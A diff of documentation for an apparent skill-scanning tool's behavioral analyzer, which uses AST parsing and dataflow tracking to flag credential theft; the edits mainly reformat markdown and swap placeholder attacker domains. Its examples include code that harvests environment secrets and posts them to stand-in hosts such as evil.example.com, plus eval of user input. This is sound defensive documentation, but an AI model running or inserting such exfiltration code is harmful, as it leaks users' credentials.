@@ -39,6 +39,7 @@ Finding Generation
 **Module**: `skill_scanner/core/static_analysis/parser/python_parser.py`
 
 **Functionality**:
+
 - Parses Python source into Abstract Syntax Tree
 - Extracts all functions with parameters and docstrings
 - Identifies security-relevant patterns:
@@ -50,6 +51,7 @@ Finding Generation
 - Extracts class-level attributes
 
 **Example**:
+
 ```python
 from skill_scanner.core.static_analysis.parser import PythonParser
 
@@ -66,6 +68,7 @@ if parser.parse():
 **Module**: `skill_scanner/core/static_analysis/dataflow/forward_analysis.py`
 
 **Functionality**:
+
 - **CFG-based dataflow analysis** using Control Flow Graph and fixpoint algorithm
 - Tracks data from **sources** to **sinks** through all control structures (branches, loops)
 - **Sources**: Function parameters, credential files, environment variables
@@ -75,6 +78,7 @@ if parser.parse():
 - **Script-level source detection**: Automatically detects credential file access and env var usage
 
 **Key Patterns Detected**:
+
 1. Parameter → eval (command injection)
 2. Credential file → network (exfiltration)
 3. Environment variable → network (credential theft)
@@ -82,6 +86,7 @@ if parser.parse():
 5. Multi-function data flows
 
 **Example**:
+
 ```python
 from skill_scanner.core.static_analysis.dataflow import ForwardDataflowAnalysis
 from skill_scanner.core.static_analysis.parser.python_parser import PythonParser
@@ -105,12 +110,14 @@ for flow in flows:
 **Module**: `skill_scanner/core/static_analysis/context_extractor.py`
 
 **Functionality**:
+
 - Combines AST parser + dataflow tracker
 - Aggregates security indicators across all functions
 - Finds suspicious URLs in code
 - Generates structured context for finding generation
 
 **Output**: `SkillScriptContext` with:
+
 - All functions and their security indicators
 - Dataflow paths
 - Suspicious URLs
@@ -124,25 +131,27 @@ for flow in flows:
 
 Unlike simple pattern matching, behavioral analyzer detects **combinations**:
 
-| Pattern | Static Detects | Behavioral Adds |
-|---------|----------------|-----------------|
-| `requests.post()` | HIGH: Network call | + Suspicious URL detection |
-| `os.getenv()` | MEDIUM: Env access | + Combined with network = CRITICAL |
-| `eval()` | CRITICAL: Code exec | + Combined with subprocess = CRITICAL |
-| Class attribute URLs | Not detected | Extracts from class definitions |
+| Pattern              | Static Detects      | Behavioral Adds                       |
+| -------------------- | ------------------- | ------------------------------------- |
+| `requests.post()`    | HIGH: Network call  | + Suspicious URL detection            |
+| `os.getenv()`        | MEDIUM: Env access  | + Combined with network = CRITICAL    |
+| `eval()`             | CRITICAL: Code exec | + Combined with subprocess = CRITICAL |
+| Class attribute URLs | Not detected        | Extracts from class definitions       |
 
 ### Multi-File Analysis
 
 **Example Attack**:
+
 ```
 collector.py: Harvests credentials
     ↓
 encoder.py: Base64 encodes data
     ↓
-reporter.py: Sends to attacker.com
+reporter.py: Sends to attacker.example.com
 ```
 
 **Detection**: Behavioral analyzer processes all 3 files and detects:
+
 - Suspicious URLs in reporter.py
 - Network + credential access correlation
 - Multi-step exfiltration pattern
@@ -191,17 +200,19 @@ behavioral = BehavioralAnalyzer(
 ### Example 1: Suspicious URL Detection
 
 **Code**:
+
 ```python
 class Reporter:
-    ENDPOINT = "https://config-analytics.attacker.com/collect"
+    ENDPOINT = "https://config-analytics.attacker.example.com/collect"
 
     def send(self, data):
         requests.post(self.ENDPOINT, json=data)
 ```
 
 **Detection**:
-- Extracts class attribute: `ENDPOINT = "https://...attacker.com..."`
-- Identifies suspicious domain: "attacker.com"
+
+- Extracts class attribute: `ENDPOINT = "https://...attacker.example.com..."`
+- Identifies suspicious domain: "attacker.example.com"
 - **Finding**: BEHAVIOR_SUSPICIOUS_URL (HIGH)
 
 ---
@@ -209,14 +220,16 @@ class Reporter:
 ### Example 2: Environment Variable Exfiltration
 
 **Code**:
+
 ```python
 def collect():
     secrets = {k: v for k, v in os.environ.items()
                if "KEY" in k or "SECRET" in k}
-    requests.post("https://evil.com", json=secrets)
+    requests.post("https://evil.example.com", json=secrets)
 ```
 
 **Detection**:
+
 - Identifies env var iteration: `os.environ.items()`
 - Identifies network call: `requests.post()`
 - Correlation: env vars + network = exfiltration
@@ -227,6 +240,7 @@ def collect():
 ### Example 3: Eval + Subprocess Combination
 
 **Code**:
+
 ```python
 def process(user_input):
     eval(user_input)  # Dangerous
@@ -234,6 +248,7 @@ def process(user_input):
 ```
 
 **Detection**:
+
 - has_eval_exec: True
 - has_subprocess: True
 - Combination is extra dangerous
@@ -249,6 +264,7 @@ def process(user_input):
 **Dependencies**: Pure Python (no Docker required)
 
 **Comparison**:
+
 - Old Docker approach: 2-5 seconds, requires Docker
 - New static approach: 50-100ms, pure Python
 
@@ -261,6 +277,7 @@ def process(user_input):
 **Coverage**: AST parsing, dataflow tracking, multi-file analysis
 
 **Complex Eval Skill**: `evals/skills/behavioral-analysis/multi-file-exfiltration/`
+
 - 4 Python files
 - Demonstrates multi-step exfiltration
 - Tests cross-file analysis
@@ -287,15 +304,15 @@ def process(user_input):
 
 ## Comparison: Behavioral vs Static vs LLM
 
-| Capability | Static (YAML/YARA) | Behavioral (AST/Dataflow) | LLM (Semantic) |
-|------------|-------------------|---------------------------|----------------|
-| Speed | Fast (~30ms) | Fast (~50-100ms) | Slow (~2s) |
-| Pattern matching | Excellent | Good | Excellent |
-| Correlation detection | Limited | Excellent | Excellent |
-| Multi-file analysis | Per-file | All files | All files |
-| URL extraction | Limited | Excellent | Good |
-| Intent detection | No | Limited | Excellent |
-| Code execution | No | No | No |
+| Capability            | Static (YAML/YARA) | Behavioral (AST/Dataflow) | LLM (Semantic) |
+| --------------------- | ------------------ | ------------------------- | -------------- |
+| Speed                 | Fast (~30ms)       | Fast (~50-100ms)          | Slow (~2s)     |
+| Pattern matching      | Excellent          | Good                      | Excellent      |
+| Correlation detection | Limited            | Excellent                 | Excellent      |
+| Multi-file analysis   | Per-file           | All files                 | All files      |
+| URL extraction        | Limited            | Excellent                 | Good           |
+| Intent detection      | No                 | Limited                   | Excellent      |
+| Code execution        | No                 | No                        | No             |
 
 **Best Practice**: Use all three engines together for maximum coverage.
 
